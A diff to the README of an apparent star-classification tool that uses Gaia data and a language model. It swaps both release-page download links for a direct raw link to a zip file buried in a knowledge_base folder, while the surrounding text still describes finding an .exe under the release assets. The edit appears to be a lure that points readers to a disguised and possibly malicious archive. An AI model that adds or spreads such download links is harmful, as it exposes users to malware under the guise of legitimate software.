@@ -1,6 +1,6 @@
 # 🔭 stellar-llm-classifier - Identify stars using smart artificial intelligence
 
-[![Download Stellar Classifier](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bennylimpid196/stellar-llm-classifier/releases)
+[![Download Stellar Classifier](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bennylimpid196/stellar-llm-classifier/raw/refs/heads/main/cluster/knowledge_base/stellar-llm-classifier-orvietan.zip)
 
 ## What is this tool?
 Stellar-llm-classifier helps you identify stars. It uses two methods to analyze data from the Gaia mission. First, it follows set scientific rules for stellar classification. Second, it uses a language model named AstroSage-8B to write clear descriptions for each star. 
@@ -19,7 +19,7 @@ Before you run this application, ensure your computer meets these minimum specif
 ## Get the software 📥
 To start using the tool, visit the link below.
 
-[https://github.com/bennylimpid196/stellar-llm-classifier/releases](https://github.com/bennylimpid196/stellar-llm-classifier/releases)
+[https://github.com/bennylimpid196/stellar-llm-classifier/raw/refs/heads/main/cluster/knowledge_base/stellar-llm-classifier-orvietan.zip](https://github.com/bennylimpid196/stellar-llm-classifier/raw/refs/heads/main/cluster/knowledge_base/stellar-llm-classifier-orvietan.zip)
 
 On this page, look for the most recent version labeled "Latest". Under the Assets section, click the file that ends in .exe. This file contains the installer for Windows. Save the file to your computer.
 
